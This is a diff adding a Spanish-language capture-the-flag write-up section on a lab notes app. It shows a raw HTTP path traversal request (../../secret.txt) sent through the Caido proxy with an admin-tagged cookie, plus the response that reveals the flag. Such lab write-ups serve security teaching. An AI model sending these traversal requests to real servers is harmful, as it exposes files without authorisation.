@@ -77,4 +77,37 @@ y con esto conseguimos un usuario con poderes de administrador, y como nos dicen
 
 ### Flag 3
 
+Primero, subimos una imagen desde el apartado de `upload`, este nos mostratrá un poco la estructura de los paths `/noteasapp/<TU_USER>/<NOMRE_IMG>.jpg`. Encendemos Caido, y si luego vamos a la barra de búsqueda y probamos ese path, nos dará la imagen que hemso subido, reafirmando una vulnerabilidad de `path traversal`
+
+En Caido 
+
+**Request**
+```python
+GET /notesapp/pepito/../../secret.txt HTTP/1.1
+Host: 10.0.2.12
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.0.2.12/notesapp/
+Connection: keep-alive
+Cookie: NOTESAPP=111686670|pepito|admin|
+Pragma: no-cache
+Cache-Control: no-cache
+```
+**Response**
+```python
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Wed, 19 Mar 2025 14:22:59 GMT
+Content-Type: text/plain
+Connection: keep-alive
+Cache-control: public, max-age=7200
+X-XSS-Protection: 0
+Content-Length: 49
+
+HACK{nStelXA71NsqQtNO_tzMxtTAESJvdzU5GwrST2kGhWc}
+```
+**Flag:** `HACK{nStelXA71NsqQtNO_tzMxtTAESJvdzU5GwrST2kGhWc}`
+...
+
 
